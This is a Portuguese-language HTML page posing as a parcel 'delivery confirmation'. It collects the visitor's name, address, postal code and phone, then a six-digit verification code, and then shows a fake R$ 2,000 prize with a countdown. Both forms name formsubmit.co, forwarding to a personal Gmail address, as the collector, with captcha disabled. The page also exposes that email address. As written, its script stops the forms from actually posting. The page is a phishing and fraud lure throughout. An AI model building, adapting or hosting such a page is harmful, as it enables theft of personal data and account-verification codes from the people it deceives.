<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <title>Confirmação de Entrega</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 400px;
      margin: 40px auto;
      background: white;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      color: #333;
    }
    label {
      display: block;
      margin: 12px 0 5px;
    }
    input {
      width: 100%;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #ff6900;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 15px;
    }
    .loading-bar {
      height: 10px;
      width: 0%;
      background: #ff6900;
      border-radius: 5px;
      margin-top: 15px;
      transition: width 1s;
    }
    .hidden {
      display: none;
    }
    .center {
      text-align: center;
    }
    .code-input {
      font-size: 24px;
      letter-spacing: 10px;
      text-align: center;
    }
  </style>
</head>
<body>

  <!-- TELA 1 - DADOS DE ENTREGA -->
  <div id="tela1" class="container">
    <h2>Preencha seus dados de entrega</h2>
    <form id="form1" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <label>Nome completo</label>
      <input type="text" name="nome" required>
      
      <label>Endereço completo</label>
      <input type="text" name="endereco" required>

      <label>CEP</label>
      <input type="text" name="cep" required>

      <label>Cidade</label>
      <input type="text" name="cidade" required>

      <label>Estado</label>
      <input type="text" name="estado" required>

      <label>Telefone</label>
      <input type="text" name="telefone" required>

      <button type="submit">Continuar</button>
    </form>
  </div>

  <!-- TELA 2 - CONFIRMAÇÃO DE CÓDIGO -->
  <div id="tela2" class="container hidden">
    <h2>Código de Confirmação</h2>
    <p class="center">Enviamos um código para validar a entrega. Insira abaixo:</p>
    <form id="form2" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <input class="code-input" type="text" name="codigo" maxlength="6" required placeholder="------">
      <button type="submit">Validar Código</button>
    </form>
  </div>

  <!-- LOADING + RESULTADO -->
  <div id="tela3" class="container hidden">
    <h2 class="center">Aguardando confirmação</h2>
    <div class="loading-bar" id="loadingBar"></div>
  </div>

  <!-- TELA FINAL -->
  <div id="telaFinal" class="container hidden">
    <h2 class="center">Parabéns!</h2>
    <p class="center">Você recebeu: <strong style="color:green;">R$ 2.000,00</strong></p>
    <p class="center">Tempo restante: <span id="contador">60</span> segundos</p>
  </div>

  <script>
    const form1 = document.getElementById('form1');
    const form2 = document.getElementById('form2');

    const tela1 = document.getElementById('tela1');
    const tela2 = document.getElementById('tela2');
    const tela3 = document.getElementById('tela3');
    const telaFinal = document.getElementById('telaFinal');
    const loadingBar = document.getElementById('loadingBar');
    const contador = document.getElementById('contador');

    form1.addEventListener('submit', function(e) {
      e.preventDefault();
      tela1.classList.add('hidden');
      tela2.classList.remove('hidden');
    });

    form2.addEventListener('submit', function(e) {
      e.preventDefault();
      tela2.classList.add('hidden');
      tela3.classList.remove('hidden');
      loadingBar.style.width = '100%';

      setTimeout(() => {
        tela3.classList.add('hidden');
        telaFinal.classList.remove('hidden');
        iniciarContador();
      }, 3000);
    });

    function iniciarContador() {
      let segundos = 60;
      const interval = setInterval(() => {
        segundos--;
        contador.textContent = segundos;
        if (segundos <= 0) {
          clearInterval(interval);
        }
      }, 1000);
    }
  </script>

</body>
</html>
